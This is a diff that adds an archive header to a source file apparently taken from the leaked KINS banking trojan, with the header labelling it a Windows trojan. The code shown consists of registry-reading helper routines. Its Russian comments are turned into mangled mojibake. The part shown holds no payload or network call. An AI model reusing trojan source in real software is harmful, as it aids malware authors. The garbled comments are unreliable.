@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <Shlwapi.h>
 
@@ -28,9 +39,9 @@ DWORD Registry::_getValueAsString(HKEY key, const LPWSTR subKey, const LPWSTR va
     if(size == 0)*buffer = 0;
     else
     {
-      DWORD i = (size / sizeof(WCHAR)) - 1; //Получаем индекс последнего символа.
+      DWORD i = (size / sizeof(WCHAR)) - 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       
-      //Последний сивмол \0, значит размер равен позиции этого символа.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ \0, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(buffer[i] == 0)size = i; 
       else if(bufferSize > ++i)
       {
@@ -40,7 +51,7 @@ DWORD Registry::_getValueAsString(HKEY key, const LPWSTR subKey, const LPWSTR va
       else goto BAD_END;
     }
 
-    if(size > 2/*мин. разме меременной 3 символа*/ && type == REG_EXPAND_SZ)
+    if(size > 2/*пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/ && type == REG_EXPAND_SZ)
     {
       LPWSTR tmpBuf = Str::_CopyExW(buffer, size);
       if(tmpBuf == NULL || CWA(kernel32, ExpandEnvironmentStringsW)(tmpBuf, buffer, bufferSize) == 0)size = (DWORD)-1;
@@ -108,7 +119,7 @@ DWORD Registry::_getValueAsBinaryEx(HKEY key, const LPWSTR subKey, const LPWSTR 
       if(bufferSize == 0)retVal = 0;
       else
       {
-        LPBYTE p = (LPBYTE)Mem::alloc(bufferSize + sizeof(WCHAR) * 2/*\0\0 для REG_*SZ*/);
+        LPBYTE p = (LPBYTE)Mem::alloc(bufferSize + sizeof(WCHAR) * 2/*\0\0 пїЅпїЅпїЅ REG_*SZ*/);
         if(p != NULL)
         {
           if(CWA(advapi32, RegQueryValueExW)(key, value, NULL, type, p, &bufferSize) == ERROR_SUCCESS)
